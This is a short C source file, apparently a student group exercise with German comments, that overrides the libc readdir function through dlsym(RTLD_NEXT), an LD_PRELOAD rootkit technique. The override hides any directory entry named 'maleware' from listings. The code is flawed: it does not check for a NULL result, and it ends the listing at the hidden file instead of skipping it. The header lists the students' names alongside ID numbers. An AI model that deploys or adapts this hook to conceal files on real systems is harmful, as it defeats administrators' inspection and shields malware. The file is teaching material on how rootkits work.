/**
*
* Gruppe:
* Dennis Röllke 108 012 233 235
* Jan Kaiser 108 012 211 505
* Phillip Müller 108 012 236 929
*
**/


#define _GNU_SOURCE

#include <sys/types.h>
#include <dlfcn.h>
#include <string.h>
#include <stdio.h>
#include <dirent.h>

// Pointer auf die Original-Funktion
static struct dirent* (*org_readdir)(DIR *dirptr) = NULL;

extern struct dirent *readdir(DIR *dirptr)
{
    struct dirent* addr = NULL;

    // laden der Funktionsadresse falls nicht schon geschehen
    if(org_readdir == NULL){
        org_readdir = dlsym(RTLD_NEXT, "readdir");
    }
    // ausfuehren der richtigen Original-Funktion
	addr = org_readdir(dirptr);
	if(strcmp(addr->d_name, "maleware") == 0){  //Wenn der Name der aktuellen Datei "maleware" lautet ...
			return NULL;						// ... gebe die aktuelle Datei nicht zurück
	}
	else										//Sonst...
	{
	return addr;								// Gebe den aktuellen Eintrag zurück
	}
}
